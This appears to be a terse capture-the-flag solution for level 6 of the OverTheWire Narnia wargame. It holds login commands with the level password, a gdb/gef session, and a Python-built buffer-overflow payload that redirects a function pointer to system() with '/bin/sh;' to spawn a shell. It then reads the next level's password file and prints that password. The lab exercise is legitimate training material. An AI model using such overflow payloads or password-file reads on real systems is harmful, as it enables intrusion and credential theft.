sftp -oPort=2226 narnia6@narnia.labs.overthewire.org
BNSjoSDeGL
get /narnia/narnia6
get /narnia/narnia6.c
exit

sshpass -p 'BNSjoSDeGL' ssh narnia6@narnia.labs.overthewire.org -p 2226
cd /narnia

gef
disassemble main
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'ABABABAB' + b' ' + b'AAAABBBBCCCCDDDDEEEE')")
# get the address of system() function
p system
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'ABABABAB' + b' ' + b'AAAABBBB/bin/sh;' + struct.pack('<I', 0xf7dcd430))")
quit

./narnia6 $(python3 -c "import sys, struct; sys.stdout.buffer.write(b'ABABABAB' + b' ' + b'AAAABBBB/bin/sh;' + struct.pack('<I', 0xf7dcd430))")

cat /etc/narnia_pass/narnia7
# Password: 54RtepCEU0